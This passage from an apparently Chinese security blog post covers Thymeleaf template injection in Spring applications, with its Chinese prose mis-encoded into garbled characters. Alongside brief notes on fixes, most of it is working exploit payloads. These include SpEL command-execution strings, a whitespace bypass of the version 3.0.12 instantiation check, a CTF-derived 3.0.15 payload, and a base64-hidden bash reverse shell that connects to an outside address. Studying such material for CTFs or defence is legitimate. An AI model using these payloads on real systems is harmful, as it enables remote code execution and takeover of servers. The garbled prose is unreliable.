class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">7d</span>__<span class="token operator">::</span><span class="token function">assadasd</span><span class="token punctuation">.</span>asdas<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>æ€»ä¹‹å°±æ˜¯è®©<code>::</code>åé¢æœ‰å†…å®¹æ‰èƒ½å®ç°å›æ˜¾</p><hr><h1 id="ä¿®å¤"><a href="#ä¿®å¤" class="headerlink" title="ä¿®å¤"></a>ä¿®å¤</h1><h2 id="é…ç½®ResponseBodyæˆ–RestControlleræ³¨è§£"><a href="#é…ç½®ResponseBodyæˆ–RestControlleræ³¨è§£" class="headerlink" title="é…ç½®ResponseBodyæˆ–RestControlleræ³¨è§£"></a>é…ç½®ResponseBodyæˆ–RestControlleræ³¨è§£</h2><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@GetMapping</span><span class="token punctuation">(</span><span class="token string">"/doc/&#123;document&#125;"</span><span class="token punctuation">)</span>    <span class="token annotation punctuation">@ResponseBody</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">getDocument</span><span class="token punctuation">(</span><span class="token annotation punctuation">@PathVariable</span> <span class="token class-name">String</span> document<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        log<span class="token punctuation">.</span><span class="token function">info</span><span class="token punctuation">(</span><span class="token string">"Retrieving "</span> <span class="token operator">+</span> document<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">//returns void, so view name is taken from URI</span>    <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>é…ç½®äº†<code>ResponseBody</code>æ³¨è§£åï¼Œåœ¨<code>applyDefaultViewName</code>ä¸­<code>ModelAndView</code>æ˜¯<code>Null</code>è€Œé<code>ModelAndView</code>å¯¹è±¡ï¼Œæ‰€ä»¥<code>hasView()</code>ä¼šå¯¼è‡´å¼‚å¸¸ï¼Œä¸ä¼šè®¾ç½®è§†å›¾å</p><p>åŸå› æ˜¯è®¾ç½®äº†<code>ResponseBody</code>æ³¨è§£åï¼Œhandlerè¿”å›çš„æ˜¯<code>RequestResponseBodyMethodProcesser</code>ï¼Œæ‰€ä»¥è¿™é‡Œä¼šè°ƒç”¨å®ƒçš„<code>handleReturnValue</code>ï¼Œè®¾ç½®äº†<code>RequestHandled</code>å±æ€§ä¸ºTrue</p><p>æ­¤æ–¹æ³•ä¹Ÿé€‚ç”¨äº<code>templatename</code>ï¼Œåœ¨è®¾ç½®äº†<code>RequestHandled</code>å±æ€§åï¼Œ<code>ModelAndView</code>ä¸€å®šä¼šè¿”å›Null</p><p>è¿™æ · spring æ¡†æ¶å°±ä¸ä¼šå°†å…¶è§£æä¸ºè§†å›¾åï¼Œè€Œæ˜¯ç›´æ¥è¿”å›ï¼Œä¸å†è°ƒç”¨æ¨¡æ¿è§£æ</p><hr><h2 id="é€šè¿‡redirect"><a href="#é€šè¿‡redirect" class="headerlink" title="é€šè¿‡redirect:"></a>é€šè¿‡redirect:</h2><blockquote><p>æ ¹æ®springbootå®šä¹‰ï¼Œå¦‚æœåç§°ä»¥<code>redirect:</code>å¼€å¤´ï¼Œåˆ™ä¸å†è°ƒç”¨<code>ThymeleafView</code>è§£æï¼Œè°ƒç”¨<code>RedirectView</code>å»è§£æ<code>controller</code>çš„è¿”å›å€¼</p></blockquote><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@GetMapping</span><span class="token punctuation">(</span><span class="token string">"/safe/redirect"</span><span class="token punctuation">)</span><span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">redirect</span><span class="token punctuation">(</span><span class="token annotation punctuation">@RequestParam</span> <span class="token class-name">String</span> url<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> <span class="token string">"redirect:"</span> <span class="token operator">+</span> url<span class="token punctuation">;</span> <span class="token comment">//FP as redirects are not resolved as expressions</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><hr><h2 id="æ–¹æ³•å‚æ•°ä¸­è®¾ç½®HttpServletResponse-å‚æ•°"><a href="#æ–¹æ³•å‚æ•°ä¸­è®¾ç½®HttpServletResponse-å‚æ•°" class="headerlink" title="æ–¹æ³•å‚æ•°ä¸­è®¾ç½®HttpServletResponse å‚æ•°"></a>æ–¹æ³•å‚æ•°ä¸­è®¾ç½®HttpServletResponse å‚æ•°</h2><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@GetMapping</span><span class="token punctuation">(</span><span class="token string">"/doc/&#123;document&#125;"</span><span class="token punctuation">)</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">getDocument</span><span class="token punctuation">(</span><span class="token annotation punctuation">@PathVariable</span> <span class="token class-name">String</span> document<span class="token punctuation">,</span> <span class="token class-name">HttpServletResponse</span> response<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        log<span class="token punctuation">.</span><span class="token function">info</span><span class="token punctuation">(</span><span class="token string">"Retrieving "</span> <span class="token operator">+</span> document<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>ç”±äºcontrollerçš„å‚æ•°è¢«è®¾ç½®ä¸ºHttpServletResponseï¼ŒSpringè®¤ä¸ºå®ƒå·²ç»å¤„ç†äº†HTTP Responseï¼Œå› æ­¤ä¸ä¼šå‘ç”Ÿè§†å›¾åç§°è§£æ</p><hr><h1 id="å…¶å®ƒå§¿åŠ¿"><a href="#å…¶å®ƒå§¿åŠ¿" class="headerlink" title="å…¶å®ƒå§¿åŠ¿"></a>å…¶å®ƒå§¿åŠ¿</h1><h2 id="ä½ç½®"><a href="#ä½ç½®" class="headerlink" title="::ä½ç½®"></a>::ä½ç½®</h2><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token operator">::</span><span class="token function">__</span>$<span class="token operator">%</span><span class="token number">7</span>bnew<span class="token operator">%</span><span class="token number">20</span>java<span class="token punctuation">.</span>util<span class="token punctuation">.</span><span class="token function">Scanner</span><span class="token punctuation">(</span><span class="token class-name">T</span><span class="token punctuation">(</span><span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span></span>Runtime</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token operator">%</span><span class="token number">22</span>open<span class="token operator">%</span><span class="token number">20</span><span class="token operator">-</span>a<span class="token operator">%</span><span class="token number">20</span>calculator<span class="token operator">%</span><span class="token number">22</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getInputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">7d</span>__<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="çœç•¥"><a href="#çœç•¥" class="headerlink" title="çœç•¥__"></a>çœç•¥__</h2><p>å½“Controllerå¦‚ä¸‹é…ç½®æ—¶ï¼Œå¯ä»¥çœç•¥<code>__</code>åŒ…è£¹</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@RequestMapping</span><span class="token punctuation">(</span><span class="token string">"/path"</span><span class="token punctuation">)</span><span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">path2</span><span class="token punctuation">(</span><span class="token annotation punctuation">@RequestParam</span> <span class="token class-name">String</span> lang<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> lang<span class="token punctuation">;</span> <span class="token comment">//template path is tainted</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>å³å»æ‰äº†å‰åç¼€</p><p>payloadï¼š</p><pre class="line-numbers language-java" data-language="java"><code class="language-java">$<span class="token operator">%</span><span class="token number">7</span>bnew<span class="token operator">%</span><span class="token number">20</span>java<span class="token punctuation">.</span>util<span class="token punctuation">.</span><span class="token function">Scanner</span><span class="token punctuation">(</span><span class="token class-name">T</span><span class="token punctuation">(</span><span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span></span>Runtime</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token operator">%</span><span class="token number">22</span>open<span class="token operator">%</span><span class="token number">20</span><span class="token operator">-</span>a<span class="token operator">%</span><span class="token number">20</span>calculator<span class="token operator">%</span><span class="token number">22</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getInputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">7d</span><span class="token operator">::</span><span class="token punctuation">.</span>x<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><hr><h1 id="é«˜ç‰ˆæœ¬ä¸‹çš„bypass"><a href="#é«˜ç‰ˆæœ¬ä¸‹çš„bypass" class="headerlink" title="é«˜ç‰ˆæœ¬ä¸‹çš„bypass"></a>é«˜ç‰ˆæœ¬ä¸‹çš„bypass</h1><p>åœ¨<strong>3.0.12</strong>ç‰ˆæœ¬ï¼ŒThymeleaf åœ¨ <code>util</code>ç›®å½•ä¸‹å¢åŠ äº†ä¸€ä¸ªåä¸º<code>SpringStandardExpressionUtils.java</code>çš„æ–‡ä»¶</p><p>å½“è°ƒç”¨è¡¨è¾¾å¼çš„æ—¶å€™ï¼Œä¼šç»è¿‡è¯¥å‡½æ•°çš„åˆ¤æ–­ï¼š</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">boolean</span> <span class="token function">containsSpELInstantiationOrStatic</span><span class="token punctuation">(</span><span class="token keyword">final</span> <span class="token class-name">String</span> expression<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">final</span> <span class="token keyword">int</span> explen <span class="token operator">=</span> expression<span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> n <span class="token operator">=</span> explen<span class="token punctuation">;</span>        <span class="token keyword">int</span> ni <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token comment">// index for computing position in the NEW_ARRAY</span>        <span class="token keyword">int</span> si <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>        <span class="token keyword">char</span> c<span class="token punctuation">;</span>        <span class="token keyword">while</span> <span class="token punctuation">(</span>n<span class="token operator">--</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            c <span class="token operator">=</span> expression<span class="token punctuation">.</span><span class="token function">charAt</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>ni <span class="token operator">&lt;</span> <span class="token constant">NEW_LEN</span>                    <span class="token operator">&amp;&amp;</span> c <span class="token operator">==</span> <span class="token constant">NEW_ARRAY</span><span class="token punctuation">[</span>ni<span class="token punctuation">]</span>                    <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span>ni <span class="token operator">></span> <span class="token number">0</span> <span class="token operator">||</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>n <span class="token operator">+</span> <span class="token number">1</span> <span class="token operator">&lt;</span> explen<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token class-name">Character</span><span class="token punctuation">.</span><span class="token function">isWhitespace</span><span class="token punctuation">(</span>expression<span class="token punctuation">.</span><span class="token function">charAt</span><span class="token punctuation">(</span>n <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                ni<span class="token operator">++</span><span class="token punctuation">;</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span>ni <span class="token operator">==</span> <span class="token constant">NEW_LEN</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span>n <span class="token operator">==</span> <span class="token number">0</span> <span class="token operator">||</span> <span class="token operator">!</span><span class="token class-name">Character</span><span class="token punctuation">.</span><span class="token function">isJavaIdentifierPart</span><span class="token punctuation">(</span>expression<span class="token punctuation">.</span><span class="token function">charAt</span><span class="token punctuation">(</span>n <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                    <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span> <span class="token comment">// we found an object instantiation</span>                <span class="token punctuation">&#125;</span>                <span class="token keyword">continue</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>ni <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                n <span class="token operator">+=</span> ni<span class="token punctuation">;</span>                ni <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span>si <span class="token operator">&lt;</span> n<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                    <span class="token comment">// This has to be restarted too</span>                    si <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>                <span class="token keyword">continue</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            ni <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>c <span class="token operator">==</span> <span class="token char">')'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                si <span class="token operator">=</span> n<span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>si <span class="token operator">></span> n <span class="token operator">&amp;&amp;</span> c <span class="token operator">==</span> <span class="token char">'('</span>                        <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>n <span class="token operator">-</span> <span class="token number">1</span> <span class="token operator">>=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span>expression<span class="token punctuation">.</span><span class="token function">charAt</span><span class="token punctuation">(</span>n <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token char">'T'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>                        <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>n <span class="token operator">-</span> <span class="token number">1</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token operator">!</span><span class="token class-name">Character</span><span class="token punctuation">.</span><span class="token function">isJavaIdentifierPart</span><span class="token punctuation">(</span>expression<span class="token punctuation">.</span><span class="token function">charAt</span><span class="token punctuation">(</span>n <span class="token operator">-</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>si <span class="token operator">></span> n <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token punctuation">(</span><span class="token class-name">Character</span><span class="token punctuation">.</span><span class="token function">isJavaIdentifierPart</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span> <span class="token operator">||</span> c <span class="token operator">==</span> <span class="token char">'.'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                si <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å¯ä»¥çœ‹åˆ°å…¶ä¸»è¦é€»è¾‘æ˜¯ï¼šé¦–å…ˆå€’åºæ£€æµ‹æ˜¯å¦åŒ…å«<code>wen</code>å…³é”®å­—ã€åœ¨<code>(</code>çš„å·¦è¾¹çš„å­—ç¬¦æ˜¯å¦æ˜¯<code>T</code>ï¼Œå¦‚åŒ…å«ï¼Œé‚£ä¹ˆè®¤ä¸ºæ‰¾åˆ°äº†ä¸€ä¸ªå®ä¾‹åŒ–å¯¹è±¡ï¼Œè¿”å›<code>true</code>ï¼Œé˜»æ­¢è¯¥è¡¨è¾¾å¼çš„æ‰§è¡Œ</p><p>å› æ­¤è¦ç»•è¿‡è¿™ä¸ªå‡½æ•°ï¼Œåªè¦æ»¡è¶³ä¸‰ç‚¹ï¼š<br>1ã€è¡¨è¾¾å¼ä¸­ä¸èƒ½å«æœ‰å…³é”®å­—<code>new</code><br>2ã€åœ¨<code>(</code>çš„å·¦è¾¹çš„å­—ç¬¦ä¸èƒ½æ˜¯<code>T</code><br>3ã€ä¸èƒ½åœ¨<code>T</code>å’Œ<code>(</code>ä¸­é—´æ·»åŠ çš„å­—ç¬¦ä½¿å¾—åŸè¡¨è¾¾å¼å‡ºç°é—®é¢˜</p><p>å…³äºè¿™ä¸ªçš„ç»•è¿‡æ–¹æ³•æ˜¯<code>%20</code>ï¼Œ<code>%0a</code>ï¼Œ<code>%09</code></p><p>æœ€ç»ˆpayloadï¼š</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token operator">/</span>path<span class="token punctuation">;</span><span class="token operator">/</span>__$<span class="token punctuation">&#123;</span><span class="token function">t</span><span class="token punctuation">(</span>java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>runtime<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getruntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token string">"calc"</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span>__<span class="token operator">::</span><span class="token punctuation">.</span>x<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token operator">/</span>path<span class="token comment">//__$&#123;t(java.lang.runtime).getruntime().exec("calc")&#125;__::.x</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>æ³¨æ„ï¼šå‘½ä»¤æ‰§è¡Œçš„payload ä¸­ä¸èƒ½å«æœ‰<code>/</code></p><hr><h1 id="2-xç‰ˆæœ¬"><a href="#2-xç‰ˆæœ¬" class="headerlink" title="2.xç‰ˆæœ¬"></a>2.xç‰ˆæœ¬</h1><p>ç‰‡æ®µè¡¨è¾¾å¼ <code>~&#123; &#125;</code>è¿™ä¸ªç‰¹æ€§æ˜¯åœ¨ 3.0 ç‰ˆæœ¬å¼•å…¥çš„ï¼Œä½†æ˜¯å…¶å® 2.x ç‰ˆæœ¬ä¹Ÿèƒ½è§¦å‘æ¼æ´</p><p>åŒæ ·å­˜åœ¨ preprocess æ–¹æ³•æ¥å¤„ç†é¢„å¤„ç†è¡¨è¾¾å¼</p><p>å¯¹äºä¸å«é¢„å¤„ç†è¡¨è¾¾å¼çš„ payload, åŒæ ·èƒ½å¤Ÿæ‰§è¡Œ, åªæ˜¯ä½ç½®ä¸å¤ªä¸€æ ·</p><hr><h1 id="å…¶å®ƒçš„payload"><a href="#å…¶å®ƒçš„payload" class="headerlink" title="å…¶å®ƒçš„payload"></a>å…¶å®ƒçš„payload</h1><pre class="line-numbers language-java" data-language="java"><code class="language-java">__$<span class="token punctuation">&#123;</span><span class="token keyword">new</span> <span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span>Scanner</span><span class="token punctuation">(</span><span class="token class-name">T</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"java.lang.Runtime"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span><span class="token string">"exec"</span><span class="token punctuation">,</span><span class="token class-name">T</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span><span class="token class-name">T</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"java.lang.Runtime"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span><span class="token string">"getRuntime"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span><span class="token class-name">T</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"java.lang.Runtime"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token string">"/bin/bash"</span><span class="token punctuation">,</span><span class="token string">"-c"</span><span class="token punctuation">,</span><span class="token string">"id"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getInputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span>__<span class="token operator">::</span><span class="token function">x</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-java" data-language="java"><code class="language-java">__$<span class="token punctuation">&#123;</span><span class="token keyword">new</span> <span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span>Scanner</span><span class="token punctuation">(</span><span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"java.lang.Runtime"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span><span class="token string">"exec"</span><span class="token punctuation">,</span><span class="token class-name">T</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span><span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"java.lang.Runtime"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span><span class="token string">"getRuntime"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span><span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"java.lang.Runtime"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token string">"/bin/bash"</span><span class="token punctuation">,</span><span class="token string">"-c"</span><span class="token punctuation">,</span><span class="token string">"id"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getInputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span>__<span class="token operator">::</span><span class="token function">x</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>3.0.15ç‰ˆæœ¬ï¼Œæ¥è‡ªäºrwctf2024</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token punctuation">[</span><span class="token punctuation">[</span>$<span class="token punctuation">&#123;</span><span class="token class-name">T</span><span class="token punctuation">(</span><span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span></span>Boolean</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"com.fasterxml.jackson.databind.ObjectMapper"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">readValue</span><span class="token punctuation">(</span><span class="token string">"&#123;&#125;"</span><span class="token punctuation">,</span><span class="token class-name">T</span><span class="token punctuation">(</span><span class="token class-name"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>expression<span class="token punctuation">.</span>spel<span class="token punctuation">.</span>standard<span class="token punctuation">.</span></span>SpelExpressionParser</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">parseExpression</span><span class="token punctuation">(</span><span class="token string">"T(Runtime).getRuntime().exec('whoami')"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getValue</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>æˆ–è€…</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name"><span class="token namespace">th:</span>href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>$&#123;''.getClass().forName('java.lang.Runtime').getRuntime().exec('bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xLjEuMS4xLzI5OTk5IDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;')&#125;<span class="token punctuation">"</span></span> <span class="token attr-name"><span class="token namespace">th:</span>title</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">'</span>pepito<span class="token punctuation">'</span></span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;å‰è¨€&quot;&gt;&lt;a href=&quot;#å‰è¨€&quot; class=&quot;headerlink&quot; title=&quot;å‰è¨€&quot;&gt;&lt;/a&gt;å‰è¨€&lt;/h1&gt;&lt;p&gt;è¶çƒ­æ‰“é“ï¼Œæ˜¨å¤©åˆšå­¦å®Œthymeleafå¼•æ“ä»Šå¤©ç›´æ¥ä¸Šæ³¨å…¥&lt;/p&gt;
&lt;p&gt;å‚è€ƒï¼š&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://xz.aliyun.com/t/10514&quot;&gt;https://xz.aliyun.com/t/10514&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://www.anquanke.com/post/id/254519&quot;&gt;https://www.anquanke.com/post/id/254519&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://exp10it.io/2023/02/%E5%AF%B9-thymeleaf-ssti-%E7%9A%84%E4%B8%80%E7%82%B9%E6%80%9D%E8%80%83/&quot;&gt;https://exp10it.io/2023/02/%E5%AF%B9-thymeleaf-ssti-%E7%9A%84%E4%B8%80%E7%82%B9%E6%80%9D%E8%80%83/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://www.cnpanda.net/sec/1063.html&quot;&gt;https://www.cnpanda.net/sec/1063.html&lt;/a&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="Web" scheme="http://c1oudfl0w0.github.io/blog/categories/Web/"/>
    
    
    <category term="SSTI" scheme="http://c1oudfl0w0.github.io/blog/tags/SSTI/"/>
    
    <category term="Java" scheme="http://c1oudfl0w0.github.io/blog/tags/Java/"/>
    
